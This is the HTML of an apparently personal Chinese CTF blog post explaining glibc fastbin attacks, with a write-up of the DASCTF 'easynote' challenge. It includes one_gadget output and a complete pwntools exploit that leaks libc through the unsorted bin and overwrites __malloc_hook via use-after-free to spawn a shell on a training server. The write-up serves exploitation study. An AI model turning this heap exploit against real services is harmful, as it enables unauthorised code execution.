@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="#3">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="img/cover.jpg">
+    <meta property="twitter:image" content="img/cover.jpg" />
+    
+
+    
+    <meta name="title" content="Pwn·Heap·Fastbinattack" />
+    <meta property="og:title" content="Pwn·Heap·Fastbinattack" />
+    <meta property="twitter:title" content="Pwn·Heap·Fastbinattack" />
+    
+
+    
+    <meta name="description" content="Zephyr&#39;s blog">
+    <meta property="og:description" content="Zephyr&#39;s blog" />
+    <meta property="twitter:description" content="Zephyr&#39;s blog" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Zephyr, Zephyr, Zephyr, , Zephyr的网络日志, Zephyr的博客, Zephyr Blog, 博客, 个人网站, 互联网, Web, CTF,">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>Pwn·Heap·Fastbinattack | Zephyr的博客 | Zephyr Blog | Zephyr#3 | #3 |</title>
+
+    <link rel="canonical" href="/fastbinattack/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link rel="stylesheet" href="/css/font-awesome.all.min.css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+ 
+ <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ["$", "$"],
+          ["\\(", "\\)"],
+        ],
+        displayMath: [
+          ["$$", "$$"],
+          ["\\[", "\\]"],
+        ],
+        processEscapes: true,
+        processEnvironments: true,
+      },
+      options: {
+        skipHtmlTags: ["script", "noscript", "style", "textarea", "pre"],
+      },
+    };
+  
+    window.addEventListener("load", (event) => {
+      document.querySelectorAll("mjx-container").forEach(function (x) {
+        x.parentElement.classList += "has-jax";
+      });
+    });
+  </script>
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script
+    type="text/javascript"
+    id="MathJax-script"
+    async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"
+  ></script>
+</head>
+<style>
+    code.has-jax {
+      -webkit-font-smoothing: antialiased;
+      background: inherit !important;
+      border: none !important;
+      font-size: 100%;
+    }
+    </style>
+
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">#3</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech/">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/about//">ABOUT</a></li>
+                    
+                        <li><a href="/course//">HISTORY</a></li>
+                    
+		            <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		           </li>
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/cover.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/pwn" title="Pwn">
+                            Pwn
+                        </a>
+                        
+                        <a class="tag" href="/tags/notebook" title="notebook">
+                            notebook
+                        </a>
+                        
+                    </div>
+                    <h1>Pwn·Heap·Fastbinattack</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                Zephyr
+                             
+                            on 
+                            Saturday, June 8, 2024
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="fastbindup">FastbinDup</h1>
+<ul>
+<li>可以将目标地址设定为return address 或者Hook Function这类可以控制执行流程的地址。</li>
+<li>注意<code>fastbin fd</code>是指向<code>chunk header</code>的，因此记得要换算一下偏移。</li>
+<li><code>Malicious Chunk</code>的<code>Size</code>须符合<code>Fastbin</code>所属的<code>Size</code></li>
+<li>在<code>libc 2.26</code>之后，<code>Fast Chunk</code>会首先进入<code>Tcache</code>，<code>libc 2.31</code>和<code>libc 2.27</code>差不多</li>
+<li>因此<code>fastbin</code>是一个很通用的打法。</li>
+<li>在支持<code>Tcache</code>的<code>libc</code>版本需要将<code>tcache</code>放满</li>
+</ul>
+<blockquote>
+</blockquote>
+<p>在tcache放满的情况下，malloc不会拿fastbin而是拿tcache，可以用calloc不会拿tcache的特性绕过。</p>
+<h1 id="具体例子">具体例子</h1>
+<h2 id="easynote">easynote</h2>
+<blockquote>
+<p>题目来源：DASCTF 2023六月挑战赛 | Pwn专项</p>
+</blockquote>
+<p>构造一个<code>chunk</code>，使其进入<code>Unsorted Bin</code>，然后打印<code>fd</code>指针即可获取一个与 <code>main_arena</code> 有固定偏移的地址，通过动态调试同时获取这个地址和libc基址，即可获取此地址与libc之间的偏移，从获取libc基址。</p>
+<ol>
+<li>申请大小为4000的准备进入<code>Unsorted Bin</code>的内存，其编号为0</li>
+<li>申请大小为4000的，防止0号内存合并进<code>top chunk</code></li>
+<li>释放掉0号内存，使其进入<code>Unsorted Bin</code>，此时原本指向数据的指针将指向chunk结构体的fd成员变量。</li>
+<li>输出0号内存的值，获取 <code>main_arena</code> 有固定偏移的地址</li>
+<li>通过调试可以获取到此时libc基址，算出地址与libc的偏移为0x3c4b78</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>one_gadget libc<span style="color:#ff79c6">-</span><span style="color:#bd93f9">2.23</span>.so <span style="color:#ff79c6">&gt;</span> pwn.txt
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0x4527a</span> <span style="color:#50fa7b">execve</span>(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>, rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x30</span>, environ)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">constraints</span>:
+</span></span><span style="display:flex;"><span>  [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x30</span>] <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span> <span style="color:#ff79c6">||</span> {[rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x30</span>], [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x38</span>], [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x40</span>], [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x48</span>], ...} is a valid argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0xf03a4</span> <span style="color:#50fa7b">execve</span>(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>, rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x50</span>, environ)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">constraints</span>:
+</span></span><span style="display:flex;"><span>  [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x50</span>] <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span> <span style="color:#ff79c6">||</span> {[rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x50</span>], [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x58</span>], [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x60</span>], [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x68</span>], ...} is a valid argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">0xf1247</span> <span style="color:#50fa7b">execve</span>(<span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>, rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x70</span>, environ)
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">constraints</span>:
+</span></span><span style="display:flex;"><span>  [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x70</span>] <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span> <span style="color:#ff79c6">||</span> {[rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x70</span>], [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x78</span>], [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x80</span>], [rsp<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x88</span>], ...} is a valid argv
+</span></span></code></pre></div><p>使用<code>Fastbin Attack</code>实现任意地址写，主要思想是控制在<code>__malloc_hook</code>附近寻找可以当作&quot;进入<code>fastbin</code>的<code>chunk</code>&ldquo;的结构体，然后通过<code>UAF</code>将进入<code>fastbin</code>的<code>chunk</code>的<code>fd</code>成员变量修改成构造的结构体地址，使<code>__malloc_hook</code>附近构造的结构体进入<code>fastbin</code>尾部，使其能够通过<code>malloc</code>获取<code>__malloc_hook</code>附近的指针，以便覆盖<code>__malloc_hook</code>的值。</p>
+<ol>
+<li>寻找<code>__malloc_hook</code>附近的内存，发现<code>__malloc_hook</code>上方存在0x000000000000007F，适合作为<code>chunk</code>的<code>size</code>，此时<code>size</code>对于<code>__malloc_hook</code>的偏移为0x1B，<code>chunk</code>地址距离<code>size</code>地址还差一个<code>prev_size</code>成员变量，因此<code>chunk</code>地址需要<code>__malloc_hook</code>地址减去0x23，其可<code>malloc</code>的大小为0x60(<code>chunk</code>大小减去<code>prev_size</code>和<code>size</code>为<code>malloc</code>出来的大小为可储存的用户数据大小为0x6F，又因为需要和2 * <code>SIZE_SZ</code>对齐，所以我们只能申请0x60的大小)</li>
+<li>申请大小为0x60(十进制96)的内存</li>
+<li>释放掉刚刚申请的内存使其进入<code>fastbin</code></li>
+<li>通过UAF修改fd指针为<code>__malloc_hook</code>0x23</li>
+<li>申请大小为0x60的内存，将刚刚进入fastbin的内存申请回来</li>
+<li>再次申请大小为0x60的内存，获取<code>__malloc_hook</code>附近的指针</li>
+<li>将其内存赋值为gadget<strong>准备</strong>获取shell(因为实际上并不能直接获取)</li>
+</ol>
+<h2 id="__malloc_hook--__realloc_hook"><strong>__malloc_hook + __realloc_hook</strong></h2>
+<p>经过测试，发现几个gadget都不能满足要求，这时候就需要调整内存结构使其满足gadget的需求，我们选取要求<code>[rsp+0x30] == NULL</code>的gadget使其满足get shell的要求，我们可以通过将<code>__mallloc_hook</code>设置成<code>realloc</code>附近地址(具体选哪里取决于我们用多少个<code>push</code>能get shell)，再将<code>__realloc_hook</code>设置成gadget来获取shell(因为<code>realloc</code>有好多<code>push</code>可以改变<code>rsp</code>使其更有可能满足gadget条件)，经过测试，直接使用<code>realloc</code>即可get shell。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>arch  <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># context.arch = &#39;amd64&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># p = process([&#34;./libc6-i386_2.31-0ubuntu9.14_amd64.so&#34;, &#34;./ISCC_easy&#34;],env={&#34;LD_PRELOAD&#34;:&#34;./libc6-i386_2.31-0ubuntu9.14_amd64.so&#34;})</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># p = process(&#39;./ISCC_easy&#39;)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># p = remote(&#34;182.92.237.102&#34;, 10013)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;tmux&#39;</span>,<span style="color:#f1fa8c">&#39;splitw&#39;</span>,<span style="color:#f1fa8c">&#39;-h&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># p = process(&#34;./pwn&#34;)</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#34;train.hitctf.cn&#34;</span>,<span style="color:#bd93f9">25931</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./libc-2.23.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">add</span>(length, payload):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;5. exit&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">1</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;The length of your content ---&gt;&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(length))
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Content ---&gt;&#34;</span>,payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">edit</span>(index, length, payload):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;5. exit&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">2</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Index ---&gt;&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(index))
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;The length of your content ---&gt;&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(length))
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Content ---&gt;&#34;</span>,payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">delete</span>(index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;5. exit&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">3</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Index ---&gt;&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(index))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">show</span>(index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;5. exit&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#bd93f9">4</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">&#34;Index ---&gt;&#34;</span>,<span style="color:#8be9fd;font-style:italic">str</span>(index))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">d</span>():
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#ff79c6">.</span>attach(p)
+</span></span><span style="display:flex;"><span>    pause()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">4000</span>,<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">4000</span>,<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># d()</span>
+</span></span><span style="display:flex;"><span>show(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;Content: &#34;</span>)
+</span></span><span style="display:flex;"><span>leak_data <span style="color:#ff79c6">=</span> u64(p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;done&#39;</span>)[:<span style="color:#ff79c6">-</span><span style="color:#bd93f9">5</span>]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>,<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#39;</span>))
+</span></span><span style="display:flex;"><span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;leak_data---&gt;</span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(leak_data)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># d()</span>
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#ff79c6">=</span> leak_data <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x3c4b78</span>
+</span></span><span style="display:flex;"><span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc_base---&gt;</span><span style="color:#f1fa8c">{</span>libc_base<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># d()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># d()</span>
+</span></span><span style="display:flex;"><span>malloc_hook <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;__malloc_hook&#39;</span>]
+</span></span><span style="display:flex;"><span>og <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x4527a</span>
+</span></span><span style="display:flex;"><span>realloc_addr <span style="color:#ff79c6">=</span> libc_base <span style="color:#ff79c6">+</span> libc<span style="color:#ff79c6">.</span>sym[<span style="color:#f1fa8c">&#39;realloc&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x60</span>,<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;aaaa&#39;</span>) <span style="color:#6272a4"># 2</span>
+</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">2</span>,<span style="color:#bd93f9">9</span>,p64(malloc_hook<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x23</span>)) <span style="color:#6272a4"># chunk.fd -&gt; malloc_hook - 0x23</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x60</span>,<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;aaaa&#39;</span>) <span style="color:#6272a4"># 拿到这个 下一个就是malloc_hook</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># d()</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># gdb.attach(p)</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x60</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">+</span>p64(og)<span style="color:#ff79c6">+</span>p64(realloc_addr)) <span style="color:#6272a4"># 改成og</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># p.sendafter(&#34;5. exit&#34;,str(1))</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># p.sendafter(&#34;The length of your content ---&gt;&#34;,str(96))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#ff79c6">.</span>interactive()
+</span></span></code></pre></div><p>此外，在pwngdb中支持利用<code>find_fake_fast [-h] addr size</code>可以找到候选的fast chunks，这个可以用于fastbin dups和house of spirit</p>
+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/blindfmt/" data-toggle="tooltip" data-placement="top" title="pwn·blindfmt学习记录">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2024/06/10/test/" data-toggle="tooltip" data-placement="top" title="hello world">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+                
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/course" title="course">
+                            course
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/crypto" title="crypto">
+                            crypto
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/ctf" title="ctf">
+                            ctf
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/notebook" title="notebook">
+                            notebook
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/pwn" title="pwn">
+                            pwn
+                        </a>
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:empire258700@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/ZephyrVictor">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="#3" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; #3 2024
+                    
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
